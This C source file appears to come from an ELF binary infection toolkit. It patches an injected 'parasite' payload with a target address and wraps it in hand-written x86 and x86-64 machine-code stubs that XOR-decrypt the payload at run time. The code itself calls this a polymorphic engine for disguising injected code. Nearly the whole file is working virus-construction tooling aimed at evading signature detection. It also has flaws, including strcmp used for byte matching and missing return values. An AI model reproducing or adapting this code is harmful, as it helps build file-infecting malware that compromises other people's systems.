#include <elfit.h>

#define X64 1
#define X32 2

#define X86_64_POLYKEY_IND (14 + 8)
#define X86_64_SIZE_IND    (25 + 8)

#define X86_POLYKEY_IND 12
#define X86_SIZE_IND 23

#define X86_POLYMMAPKEY_IND
#define X86_MMAPSIZE_IND 

int patch_parasite32(Elfit_t *parasite, uint32_t patchpos, uint32_t vaddr)
{
    int i;

    if (patchpos==0)
    {
        printf("[+ USING SMART PATCHING]\n");
        for (i=0;i<parasite->file->st_size;i++)
        {
            if (!strcmp(&parasite->mem[i], "\x33\x22\x11"))
            {
                patchpos = i;
                break;
            }
        }
    }

    if (patchpos==0)
    {
	printf("[- SMART PATCHING PATTERN NOT FOUND]\n");	
	printf("[! DECIDED NOT TO PATCH]\n");
	return 0;
    }
    else
    	printf("[+ PATCHING POSITION %d IN PARASITE]\n", patchpos);

    if (patchpos >= parasite->file->st_size)
        return -1;
    *(uint32_t *)&parasite->mem[patchpos] = vaddr;

    return 0;
}

int patch_parasite64(Elfit_t *parasite, uint32_t patchpos, uint64_t vaddr)
{
    int arch = X64;
    int i;

    if (patchpos==0)
    {
        printf("[+ USING SMART PATCHING]\n");
        for (i=0;i<parasite->file->st_size;i++)
        {
            if (!strcmp(&parasite->mem[i], "\x77\x66\x55\x44\x33\x22\x11"))
            {
                patchpos = i;
                break;
            }
        }
    }

    /* possible we are trying to patch into a 32bit parasite */
    if (patchpos==0)
    {
        for (i=0;i<parasite->file->st_size;i++)
        {
            if (!strcmp(&parasite->mem[i], "\x33\x22\x11"))
            {
                arch = X32;
                patchpos = i;
                break;
            }
        }
    }

    if (patchpos == 0)
    {
	printf("[- SMART PATCHING PATTERN NOT FOUND]\n");	
	printf("[! DECIDED NOT TO PATCH]\n");
	return 0;
    }
    else
    	printf("[+ PATCHING POSITION %d IN PARASITE]\n", patchpos);

    if (patchpos >= parasite->file->st_size)
        return -1;

    if (arch == X64)
        *(uint64_t *)&parasite->mem[patchpos] = vaddr;
    else if (arch == X32)
    {
        printf("[!] performing patch on 32bit parasite\n");
        *(uint32_t *)&parasite->mem[patchpos] = vaddr;
    }

    return 0;
}

/* x86_64 specific primitize polymorphic engine */
int parasite_polymorphize64(Elfit_t *parasite, char key)
{
    /*
    unsigned char preamble[] = {
          0xeb, 0x02, 0xeb, 0x13, 0x48, 0x31, 0xc0, 0x48, 0x31, 0xff, 0x48, 0x31,
          0xf6, 0xb8, 0x00, 0x00, 0x00, 0x00, 0xe8, 0xeb, 0xff, 0xff, 0xff, 0x5b,
          0xbe, 0x00, 0x00, 0x00, 0x00, 0x48, 0x83, 0xc3, 0x16, 0x48, 0x31, 0x04,
          0x3b, 0x48, 0xff, 0xc7, 0x48, 0x39, 0xf7, 0x7c, 0xf4
    };
    unsigned int preamble_len = 45;
    */

    unsigned char preamble[] = { // + 8
          0x57, 0x56, 0x52, 0x51, 0x41, 0x50, 0x41, 0x51, 0xeb, 0x02, 0xeb, 0x13,
          0x48, 0x31, 0xc0, 0x48, 0x31, 0xff, 0x48, 0x31, 0xf6, 0xb8, 0x00, 0x00,
          0x00, 0x00, 0xe8, 0xeb, 0xff, 0xff, 0xff, 0x5b, 0xbe, 0x00, 0x00, 0x00,
          0x00, 0x48, 0x83, 0xc3, 0x1e, 0x48, 0x31, 0x04, 0x3b, 0x48, 0xff, 0xc7,
          0x48, 0x39, 0xf7, 0x7c, 0xf4, 0x41, 0x59, 0x41, 0x58, 0x59, 0x5a, 0x5e,
          0x5f
    };
    unsigned int preamble_len = 61;


    int i;
    char *newmem;

    newmem = malloc(preamble_len + parasite->file->st_size);
    if (newmem==NULL)
    {
        perror("allocating space for polymorphic preamble\n");
    }
    memcpy(newmem, preamble, preamble_len);

    /* modify polymorphic parameters */
    *(uint32_t *)&newmem[X86_64_POLYKEY_IND] = key;
    *(uint32_t *)&newmem[X86_64_SIZE_IND] = parasite->file->st_size;

    memcpy(&newmem[preamble_len], parasite->mem, parasite->file->st_size);

    /* now xor encrypt the origin machine code */
    for (i=0;i<parasite->file->st_size;i++)
        newmem[preamble_len+i] ^= key;

    /* debug */
    parasite->file->st_size += preamble_len;

    free(parasite->mem);
    parasite->mem = newmem;
}

int parasite_polymorphize32(Elfit_t *parasite, char key)
{
    unsigned char preamble[] = {
	0x60, 0xeb, 0x02, 0xeb, 0x10, 0x31, 0xc0, 0x31, 0xff, 0x31, 0xf6, 0xb8,
  	0x00, 0x00, 0x00, 0x00, 0xe8, 0xee, 0xff, 0xff, 0xff, 0x5b, 0xbe, 0x00,
  	0x00, 0x00, 0x00, 0x83, 0xc3, 0x12, 0x31, 0x04, 0x3b, 0x47, 0x39, 0xf7,
  	0x7c, 0xf8, 0x61
    };
    unsigned int preamble_len = 39;


    int i;
    char *newmem;

    newmem = malloc(preamble_len + parasite->file->st_size);
    if (newmem==NULL)
    {
        perror("allocating space for polymorphic preamble\n");
    }
    memcpy(newmem, preamble, preamble_len);

    /* modify polymorphic parameters */
    *(uint32_t *)&newmem[X86_POLYKEY_IND] = key;
    *(uint32_t *)&newmem[X86_SIZE_IND] = parasite->file->st_size;

    memcpy(&newmem[preamble_len], parasite->mem, parasite->file->st_size);

    /* now xor encrypt the origin machine code */
    for (i=0;i<parasite->file->st_size;i++)
        newmem[preamble_len+i] ^= key;

    /* debug */
    parasite->file->st_size += preamble_len;

    free(parasite->mem);
    parasite->mem = newmem;
}
